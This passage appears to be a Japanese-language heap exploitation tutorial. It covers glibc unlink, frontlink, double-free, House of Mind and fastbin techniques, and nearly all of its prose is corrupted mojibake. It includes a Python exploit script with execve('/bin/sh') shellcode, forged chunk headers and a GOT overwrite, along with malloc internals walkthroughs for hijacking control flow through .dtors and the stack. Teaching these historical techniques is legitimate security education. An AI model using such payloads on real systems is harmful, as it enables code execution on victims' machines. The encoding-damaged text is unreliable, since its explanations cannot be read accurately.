ã—ãŸãŒã£ã¦ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯æ¬¡ã®ã‚ˆã†ã«ä½œæˆã•ã‚Œã¾ã™:

buffer1ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’å…¥ã‚Œã€æœ€åˆã«jmpã‚’å…¥ã‚Œã¦nopsã¾ãŸã¯ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®æ®‹ã‚Šã«é£›ã¶ã‚ˆã†ã«ã—ã¾ã™ã€‚

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®å¾Œã«ã€æ¬¡ã®ãƒãƒ£ãƒ³ã‚¯ã®prev\_sizeã¨sizeãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«åˆ°é”ã™ã‚‹ã¾ã§ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‚’å…¥ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®å ´æ‰€ã«0xfffffff0ï¼ˆprev\_sizeãŒç©ºã„ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã™ãƒ“ãƒƒãƒˆã‚’æŒã¤ã‚ˆã†ã«ä¸Šæ›¸ãã•ã‚Œã‚‹ï¼‰ã¨â€œ-4â€ï¼ˆ0xfffffffcï¼‰ã‚’sizeã«å…¥ã‚Œã¾ã™ï¼ˆ3ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã§2ç•ªç›®ãŒå®Ÿéš›ã«ç©ºã„ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹éš›ã«ã€å¤‰æ›´ã•ã‚ŒãŸprev\_sizeã«è¡Œãã‚ˆã†ã«ã—ã¾ã™ï¼‰ -> ã“ã‚Œã«ã‚ˆã‚Šã€free()ãŒèª¿æŸ»ã™ã‚‹ã¨ã€3ç•ªç›®ã®sizeã«è¡Œãã¾ã™ãŒã€å®Ÿéš›ã«ã¯2ç•ªç›®ã®-4ã«è¡Œãã€2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒç©ºã„ã¦ã„ã‚‹ã¨è€ƒãˆã¾ã™ã€‚ãã—ã¦ã€**unlink()**ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

unlink()ã‚’å‘¼ã³å‡ºã™ã¨ã€P->fdã¨ã—ã¦2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®æœ€åˆã®ãƒ‡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã€ãã“ã«ä¸Šæ›¸ãã—ãŸã„ã‚¢ãƒ‰ãƒ¬ã‚¹-12ï¼ˆFD->bkã«12ã‚’åŠ ç®—ã—ã¾ã™ï¼‰ã‚’å…¥ã‚Œã¾ã™ã€‚ãã—ã¦ã€ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã§è¦‹ã¤ã‘ãŸ2ç•ªç›®ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å…¥ã‚Œã¾ã™ã€‚ã“ã‚ŒãŒã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¸ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆå½ã®P->bkï¼‰ã«ãªã‚Šã¾ã™ã€‚

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12ãƒã‚¤ãƒˆã®ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #å‰ã®ãƒãƒ£ãƒ³ã‚¯ãŒç©ºã„ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã™ãƒ“ãƒƒãƒˆãŒ1ã§ã‚ã‚‹ã“ã¨ãŒé‡è¦ã§ã™**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4ã€3ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®â€œsizeâ€ãŒ4ãƒã‚¤ãƒˆå¾Œã‚ã«ã‚ã‚‹ã¨è€ƒãˆã•ã›ã‚‹ãŸã‚ï¼ˆprev\_sizeã‚’æŒ‡ã™ï¼‰**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®æœ€åˆã«8ãƒã‚¤ãƒˆã®ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‚’å…¥ã‚Œã¾ã™**

**got\_free = pack("\<I", 0x08048300 - 12) #free()ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’plt-12ã«ï¼ˆã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ä¸Šæ›¸ãã•ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼‰**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯æœ€åˆã«8ãƒã‚¤ãƒˆã®ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‹ã‚‰å§‹ã¾ã‚Šã¾ã™**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã‚’å¤‰æ›´ã—ã€got\_freeã¯addr\_sc + 12ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¿å­˜ã™ã‚‹å ´æ‰€ã‚’æŒ‡ã—ã¾ã™**

**os.system("./8.3.o " + payload)**

**unset() é€†é †ã§è§£æ”¾ï¼ˆwargameï¼‰**

3ã¤ã®é€£ç¶šã—ãŸãƒãƒ£ãƒ³ã‚¯ã‚’åˆ¶å¾¡ã—ã¦ãŠã‚Šã€äºˆç´„ã•ã‚ŒãŸé †åºã¨ã¯é€†ã«è§£æ”¾ã•ã‚Œã¾ã™ã€‚

ãã®å ´åˆ:

ãƒãƒ£ãƒ³ã‚¯cã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ç½®ãã¾ã™ã€‚

ãƒãƒ£ãƒ³ã‚¯aã‚’ä½¿ç”¨ã—ã¦bã‚’ä¸Šæ›¸ãã—ã€sizeãŒPREV\_INUSEãƒ“ãƒƒãƒˆã‚’ã‚ªãƒ•ã«ã—ã¦ã€ãƒãƒ£ãƒ³ã‚¯aãŒç©ºã„ã¦ã„ã‚‹ã¨è€ƒãˆã•ã›ã¾ã™ã€‚

ã•ã‚‰ã«ã€bã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®sizeã‚’-4ã«ä¸Šæ›¸ãã—ã¾ã™ã€‚

ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯â€œaâ€ãŒç©ºã„ã¦ã„ã‚‹ã¨è€ƒãˆã€binã«å…¥ã‚‹ãŸã‚ã€unlink()ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚ã—ã‹ã—ã€ãƒ˜ãƒƒãƒ€ãƒ¼ã®PREV\_SIZEãŒ-4ã§ã‚ã‚‹ãŸã‚ã€ãƒãƒ£ãƒ³ã‚¯â€œaâ€ã¯å®Ÿéš›ã«ã¯b+4ã‹ã‚‰å§‹ã¾ã‚‹ã¨è€ƒãˆã¾ã™ã€‚ã¤ã¾ã‚Šã€b+4ã‹ã‚‰å§‹ã¾ã‚‹ãƒãƒ£ãƒ³ã‚¯ã«unlink()ã‚’è¡Œã„ã€b+12ã«fdãƒã‚¤ãƒ³ã‚¿ãŒã‚ã‚Šã€b+16ã«bkãƒã‚¤ãƒ³ã‚¿ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®ã‚ˆã†ã«ã—ã¦ã€bkã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã€fdã«â€œputs()â€ã®ã‚¢ãƒ‰ãƒ¬ã‚¹-12ã‚’å…¥ã‚Œã‚‹ã“ã¨ã§ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå®Œæˆã—ã¾ã™ã€‚

**ãƒ•ãƒ­ãƒ³ãƒˆãƒªãƒ³ã‚¯æŠ€è¡“**

ãƒ•ãƒ­ãƒ³ãƒˆãƒªãƒ³ã‚¯ã¯ã€ä½•ã‹ã‚’è§£æ”¾ã—ãŸã¨ãã«ãã®éš£æ¥ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ãŒç©ºã„ã¦ã„ãªã„å ´åˆã«å‘¼ã³å‡ºã•ã‚Œã€unlink()ã§ã¯ãªãç›´æ¥frontlink()ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚

mallocãŒæ”»æ’ƒã•ã‚Œã‚‹ã¨ãã«æ±ºã—ã¦è§£æ”¾ã•ã‚Œãªã„å ´åˆã«æœ‰ç”¨ã§ã™ã€‚

å¿…è¦ãªã‚‚ã®:

ãƒ‡ãƒ¼ã‚¿å…¥åŠ›é–¢æ•°ã§ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã§ãã‚‹ãƒãƒƒãƒ•ã‚¡

ã“ã®éš£æ¥ã™ã‚‹ãƒãƒƒãƒ•ã‚¡ã¯è§£æ”¾ã•ã‚Œã€å‰ã®ãƒãƒƒãƒ•ã‚¡ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã«ã‚ˆã£ã¦ãƒ˜ãƒƒãƒ€ãƒ¼ã®fdãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒå¤‰æ›´ã•ã‚Œã¾ã™ã€‚

ã‚µã‚¤ã‚ºãŒ512ã‚ˆã‚Šå¤§ãã„ãŒå‰ã®ãƒãƒƒãƒ•ã‚¡ã‚ˆã‚Šå°ã•ã„ãƒãƒƒãƒ•ã‚¡

ã“ã®3ç•ªç›®ã®ãƒãƒƒãƒ•ã‚¡ã®prev\_sizeã‚’ä¸Šæ›¸ãã§ãã‚‹ã‚ˆã†ã«ã€å‰ã«å®£è¨€ã•ã‚ŒãŸãƒãƒƒãƒ•ã‚¡

ã“ã®ã‚ˆã†ã«ã—ã¦ã€2ã¤ã®mallocã‚’åˆ¶å¾¡ä¸èƒ½ã«ä¸Šæ›¸ãã—ã€1ã¤ã‚’åˆ¶å¾¡ã•ã‚ŒãŸå½¢ã§è§£æ”¾ã™ã‚‹ã“ã¨ã§ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã§ãã¾ã™ã€‚

**ãƒ€ãƒ–ãƒ«ãƒ•ãƒªãƒ¼()ã®è„†å¼±æ€§**

åŒã˜ãƒã‚¤ãƒ³ã‚¿ã§free()ã‚’2å›å‘¼ã³å‡ºã™ã¨ã€2ã¤ã®binãŒåŒã˜ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã¾ã™ã€‚

1ã¤ã‚’å†åˆ©ç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€å•é¡Œãªãå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚åˆ¥ã®ã‚‚ã®ã‚’ä½¿ç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€åŒã˜ã‚¹ãƒšãƒ¼ã‚¹ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã‚‹ãŸã‚ã€ãƒã‚¤ãƒ³ã‚¿â€œfdâ€ã¨â€œbkâ€ãŒä»¥å‰ã®äºˆç´„ã«ã‚ˆã£ã¦æ›¸ãè¾¼ã¾ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã§å½è£…ã•ã‚Œã¾ã™ã€‚

**free()å¾Œ**

ä»¥å‰ã«è§£æ”¾ã•ã‚ŒãŸãƒã‚¤ãƒ³ã‚¿ãŒå†ã³åˆ¶å¾¡ãªã—ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

## **8 ãƒ’ãƒ¼ãƒ—ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼: é«˜åº¦ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**

unlink()ã¨frontlink()ã®æŠ€è¡“ã¯ã€unlink()é–¢æ•°ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§å‰Šé™¤ã•ã‚Œã¾ã—ãŸã€‚

**å¿ƒã®å®¶**

ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€free()ã‚’1å›å‘¼ã³å‡ºã™ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚æ”»æ’ƒè€…ãŒå‰ã®ãƒãƒ£ãƒ³ã‚¯ã«ã‚ˆã£ã¦ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã•ã‚Œã€è§£æ”¾ã•ã‚Œã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã‚’æ¢ã™ã“ã¨ãŒé‡è¦ã§ã™ã€‚

free()ã®å‘¼ã³å‡ºã—ã¯public\_fREe(mem)ã‚’å‘¼ã³å‡ºã—ã€ã“ã‚Œã‚’è¡Œã„ã¾ã™:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mem); â€”> ãƒãƒ£ãƒ³ã‚¯ã®é–‹å§‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¸ã®ãƒã‚¤ãƒ³ã‚¿ã‚’è¿”ã—ã¾ã™ï¼ˆmem-8ï¼‰

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1]ã§ã¯ã€sizeãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®NON\_MAIN\_ARENAãƒ“ãƒƒãƒˆã‚’ç¢ºèªã—ã€ã“ã®ãƒ“ãƒƒãƒˆã‚’å¤‰æ›´ã—ã¦ãƒã‚§ãƒƒã‚¯ãŒtrueã‚’è¿”ã™ã‚ˆã†ã«ã—ã€heap\_for\_ptr()ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€memã®æœ€ã‚‚é‡è¦ã§ãªã„2.5ãƒã‚¤ãƒˆãŒ0ã«è¨­å®šã•ã‚Œï¼ˆã“ã®å ´åˆ0x0804a000ã‹ã‚‰0x08000000ã«ãªã‚Šã¾ã™ï¼‰ã€0x08000000->ar\_ptrã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ï¼ˆheap\_infoæ§‹é€ ä½“ã®ã‚ˆã†ã«ï¼‰ã€‚

ã“ã®ã‚ˆã†ã«ã—ã¦ã€ä¾‹ãˆã°0x0804a000ã®ãƒãƒ£ãƒ³ã‚¯ã‚’åˆ¶å¾¡ã§ãã€**0x081002a0**ã§ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã‚‹ã¨ã€0x08100000ã«åˆ°é”ã—ã€ä»»æ„ã®ã‚‚ã®ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°**0x0804a000**ã€‚ã“ã®2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã‚‹ã¨ã€heap\_for\_ptr(ptr)->ar\_ptrã¯0x08100000ã«æ›¸ãè¾¼ã¾ã‚ŒãŸã‚‚ã®ã‚’è¿”ã—ã¾ã™ï¼ˆå‰è¿°ã®andãŒ0x081002a0ã«é©ç”¨ã•ã‚Œã€æœ€åˆã®4ãƒã‚¤ãƒˆã®å€¤ãŒå–å¾—ã•ã‚Œã¾ã™ï¼‰ã€‚

ã“ã®ã‚ˆã†ã«ã—ã¦ã€\_int\_free(ar\_ptr, mem)ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã™ã€‚ã¤ã¾ã‚Šã€**\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

å‰è¿°ã®ã‚ˆã†ã«ã€avã®å€¤ã‚’åˆ¶å¾¡ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€è§£æ”¾ã•ã‚Œã‚‹ãƒãƒ£ãƒ³ã‚¯ã«æ›¸ãè¾¼ã‚“ã ã‚‚ã®ã§ã™ã€‚

unsorted\_chunksãŒå®šç¾©ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€æ¬¡ã®ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

ã—ãŸãŒã£ã¦ã€av->bins\[2]ã«\_\_DTOR\_END\_\_-12ã®å€¤ã‚’æ›¸ãè¾¼ã‚€ã¨ã€æœ€å¾Œã®å‘½ä»¤ã§\_\_DTOR\_END\_\_ã«2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚

ã¤ã¾ã‚Šã€æœ€åˆã®ãƒãƒ£ãƒ³ã‚¯ã®æœ€åˆã«\_\_DTOR\_END\_\_-12ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½•åº¦ã‚‚å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãªãœãªã‚‰ã€av->bins\[2]ãŒãã“ã‹ã‚‰å–å¾—ã™ã‚‹ã‹ã‚‰ã§ã™ã€‚

2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æœ€å¾Œã®5ã¤ã®ã‚¼ãƒ­ãŒã‚ã‚‹å ´åˆã€æœ€åˆã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€heap\_for\_ptr()ã¯ar\_ptrãŒæœ€åˆã®ãƒãƒ£ãƒ³ã‚¯ã®é–‹å§‹ä½ç½®ã«ã‚ã‚‹ã¨è€ƒãˆã€av->bins\[2]ã‚’å–å¾—ã—ã¾ã™ã€‚

2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ã§ã¯ã€æœ€åˆã®ãƒãƒ£ãƒ³ã‚¯ã®ãŠã‹ã’ã§prev\_sizeã‚’0x0cã®jmpã§ä¸Šæ›¸ãã—ã€sizeã‚’NON\_MAIN\_ARENAã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã®ä½•ã‹ã«ã—ã¾ã™ã€‚

æ¬¡ã«ã€ãƒãƒ£ãƒ³ã‚¯2ã«ãŸãã•ã‚“ã®nopsã‚’ç½®ãã€æœ€å¾Œã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ç½®ãã¾ã™ã€‚

ã“ã®ã‚ˆã†ã«ã—ã¦ã€\_int\_free(TROZO1, TROZO2)ãŒå‘¼ã³å‡ºã•ã‚Œã€TROZO2ã®prev\_sizeã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¸ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒæ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚

ã“ã®æŠ€è¡“ã‚’é©ç”¨ã™ã‚‹ã«ã¯ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å°‘ã—è¤‡é›‘ã«ã™ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®è¦ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®æŠ€è¡“ã¯ã€unlinkã«å¯¾ã—ã¦ã»ã¼åŒã˜ãƒ‘ãƒƒãƒãŒé©ç”¨ã•ã‚ŒãŸãŸã‚ã€ã‚‚ã¯ã‚„é©ç”¨ã§ãã¾ã›ã‚“ã€‚æ–°ã—ã„ãƒã‚¤ãƒ³ã‚¿ãŒè‡ªåˆ†è‡ªèº«ã‚’æŒ‡ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’æ¯”è¼ƒã—ã¾ã™ã€‚

**ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³**

ã“ã‚Œã¯å¿ƒã®å®¶ã®å¤‰ç¨®ã§ã™ã€‚

æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚ã“ã‚Œã¯ã€\_int\_free()é–¢æ•°ã®æœ€åˆã®ãƒã‚§ãƒƒã‚¯ã‚’é€šéã—ãŸå¾Œã«åˆ°é”ã—ã¾ã™ã€‚

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

ã“ã®ã‚ˆã†ã«ã—ã¦ã€fbã«GOTã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å…¥ã‚Œã‚‹ã¨ã€ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä¸Šæ›¸ãã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå…¥ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ã«ã¯ã€ã‚¢ãƒªãƒ¼ãƒŠãŒdtorsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®è¿‘ãã«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚ˆã‚Šæ­£ç¢ºã«ã¯ã€av->max\_fastãŒä¸Šæ›¸ãã™ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

å¿ƒã®å®¶ã§è¦‹ãŸã‚ˆã†ã«ã€avã®ä½ç½®ã‚’åˆ¶å¾¡ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€sizeãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«8 + NON\_MAIN\_ARENA + PREV\_INUSEã®ã‚µã‚¤ã‚ºã‚’å…¥ã‚Œã‚‹ã¨ã€fastbin\_index()ã¯fastbins\[-1]ã‚’è¿”ã—ã€av->max\_fastã‚’æŒ‡ã—ã¾ã™ã€‚

ã“ã®å ´åˆã€av->max\_fastã¯ä¸Šæ›¸ãã•ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ãªã‚Šã¾ã™ï¼ˆæŒ‡ã™ã®ã§ã¯ãªãã€ãã®ä½ç½®ãŒä¸Šæ›¸ãã•ã‚Œã¾ã™ï¼‰ã€‚

ã•ã‚‰ã«ã€è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®éš£æ¥ãƒãƒ£ãƒ³ã‚¯ã¯8ã‚ˆã‚Šå¤§ãããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ -> å…ˆã»ã©è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒ8ã§ã‚ã‚‹ãŸã‚ã€ã“ã®å½ã®ãƒãƒ£ãƒ³ã‚¯ã«ã¯8ã‚ˆã‚Šå¤§ãã„ã‚µã‚¤ã‚ºã‚’å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒè§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã«å…¥ã‚‹ãŸã‚ã€æœ€åˆã«nopsã«é£›ã¶jmpã‚’å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

ã•ã‚‰ã«ã€ã“ã®å½ã®ãƒãƒ£ãƒ³ã‚¯ã¯av->system\_memã‚ˆã‚Šå°ã•ããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚av->system\_memã¯1848ãƒã‚¤ãƒˆå…ˆã«ã‚ã‚Šã¾ã™ã€‚

\_\_DTOR\_END\_ã®ã‚¼ãƒ­ã¨GOTã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å°‘ãªã•ã®ãŸã‚ã€ã“ã‚Œã‚‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ä¸Šæ›¸ãã™ã‚‹ã®ã«é©ã—ã¦ã„ãªã„ãŸã‚ã€ã‚¹ã‚¿ãƒƒã‚¯ã‚’æ”»æ’ƒã™ã‚‹ãŸã‚ã«ãƒ•ã‚¡ã‚¹ãƒˆãƒ“ãƒ³ã‚’é©ç”¨ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

åˆ¥ã®æ”»æ’ƒæ–¹æ³•ã¯ã€**av**ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹ã“ã¨ã§ã™ã€‚

ã‚µã‚¤ã‚ºã‚’8ã§ã¯ãªã16ã«å¤‰æ›´ã™ã‚‹ã¨ã€fastbin\_index()ã¯fastbins\[0]ã‚’è¿”ã—ã€ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‚’ä¸Šæ›¸ãã§ãã¾ã™ã€‚

ã“ã‚Œã‚’è¡Œã†ã«ã¯ã€canaryã‚„ã‚¹ã‚¿ãƒƒã‚¯ã«å¥‡å¦™ãªå€¤ãŒãªã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å®Ÿéš›ã€æ¬¡ã®ã‚ˆã†ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™: 4ãƒã‚¤ãƒˆã®ã‚¼ãƒ­ + EBP + RET

4ãƒã‚¤ãƒˆã®ã‚¼ãƒ­ã¯ã€**av**ãŒã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€**av**ã®æœ€åˆã®è¦ç´ ã¯ãƒŸãƒ¥ãƒ¼ãƒ†ãƒƒã‚¯ã‚¹ã§0ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

**av->max\_fast**ã¯EBPã§ã‚ã‚Šã€åˆ¶ç´„ã‚’å›é¿ã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¤å€¤ã«ãªã‚Šã¾ã™ã€‚

**av->fastbins\[0]**ã¯**p**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ä¸Šæ›¸ãã•ã‚Œã€RETã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«é£›ã³ã¾ã™ã€‚

ã•ã‚‰ã«ã€**av->system\_mem**ï¼ˆã‚¹ã‚¿ãƒƒã‚¯ã®ä½ç½®ã‹ã‚‰1484ãƒã‚¤ãƒˆä¸Šï¼‰ã«ã¯ã€ãƒã‚§ãƒƒã‚¯ã‚’å›é¿ã™ã‚‹ãŸã‚ã®ååˆ†ãªã‚´ãƒŸãŒå«ã¾ã‚Œã¾ã™ã€‚

ã•ã‚‰ã«ã€è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®éš£æ¥ãƒãƒ£ãƒ³ã‚¯ã¯8ã‚ˆã‚Šå¤§ãããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ -> å…ˆã»ã©è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒ16ã§ã‚ã‚‹ãŸã‚ã€ã“ã®å½ã®ãƒãƒ£ãƒ³ã‚¯ã«ã¯8ã‚ˆã‚Šå¤§ãã„ã‚µã‚¤ã‚ºã‚’å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒè§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã«å…¥ã‚‹ãŸã‚ã€æœ€åˆã«nopsã«é£›ã¶jmpã‚’å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

